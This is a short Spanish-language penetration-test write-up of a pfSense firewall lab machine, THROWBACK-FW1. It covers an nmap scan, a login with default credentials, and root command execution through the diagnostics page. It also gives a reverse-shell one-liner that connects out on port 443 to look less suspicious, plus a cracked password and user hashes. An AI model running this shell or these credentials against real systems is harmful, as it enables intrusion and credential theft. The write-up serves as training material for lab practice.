# THROWBACK-FW1

## Initial Scan
```
22/tcp  open  ssh      OpenSSH 7.5 (protocol 2.0)
| ssh-hostkey: 
|_  256 e8:75:f3:79:a4:dd:f3:25:9b:2b:33:54:dc:86:59:af (ED25519)
53/tcp  open  domain   (generic dns response: REFUSED)
80/tcp  open  http     nginx
|_http-title: Did not follow redirect to https://10.200.27.138/
|_https-redirect: ERROR: Script execution failed (use -d to debug)
443/tcp open  ssl/http nginx
|_http-title: pfSense - Login
| ssl-cert: Subject: commonName=pfSense-5f099cf870c18/organizationName=pfSense webConfigurator Self-Signed Certificate
| Subject Alternative Name: DNS:pfSense-5f099cf870c18
| Not valid before: 2020-07-11T11:05:28
|_Not valid after:  2021-08-13T11:05:28
|_ssl-date: TLS randomness does not represent time
| tls-alpn: 
|   h2
|_  http/1.1
| tls-nextprotoneg: 
|   h2
|_  http/1.1
```
## Enum
### Web Server
Las creds por defecto de pfsense funcionan para entrar

## Exploit
En el endpoint de diagnostics podemos ejecutar comandos en el sistema, si ejecutamos id veremos que es nuestro dia de suerte
```
uid=0(root) gid=0(wheel) groups=0(wheel)
```
Spawneamos una reverse shell, vamos a usar sobre todo puertos comunes para las reverse shell al fin de no crear trafico muy sospechoso en ele firewall
```
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|telnet IP 443 > /tmp/f
```

## Post Explotation
### Login.log
```
Last Login 8/9/2020 15:51 -- HumphreyW:1c13639dba96c7b53d26f7d00956a364
```
Crackeamos la pass securitycenter

### /etc/spwd.db
Aquí encontraremos los hashes de varios usuarios
```
admin:$2y$10$q81moODbYy1KXoLJxIoc1uXlpBKeSCiieaKiNxjPqTLmNZY3n/Fga
ec2-user:$2y$10$zae.EdVMDyWWVJGAQEOtdO7fTAp.6BWOeFnSYf7qV45rjsnKg0DEC
root:$2y$10$q81moODbYy1KXoLJxIoc1uXlpBKeSCiieaKiNxjPqTLmNZY3n/Fga
```
